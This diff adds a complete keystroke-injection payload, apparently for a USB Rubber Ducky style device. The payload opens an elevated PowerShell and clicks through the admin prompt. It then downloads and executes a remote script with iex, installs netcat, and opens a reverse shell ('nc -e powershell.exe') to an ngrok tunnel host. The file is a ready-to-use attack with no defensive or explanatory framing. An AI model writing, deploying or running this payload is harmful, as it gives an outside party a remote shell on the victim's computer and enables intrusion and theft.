@@ -1,0 +1,23 @@
+DELAY 200
+GUI r
+
+DELAY 200
+STRING powershell -NoP -NonI
+CTRL SHIFT ENTER
+
+DELAY 500
+LEFTARROW
+ENTER
+
+DELAY 500
+STRING Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
+ENTER
+
+DELAY 200
+STRING choco install netcat
+ENTER
+STRING Y
+ENTER
+STRING nc -e powershell.exe 0.tcp.jp.ngrok.io 14444
+ENTER
+
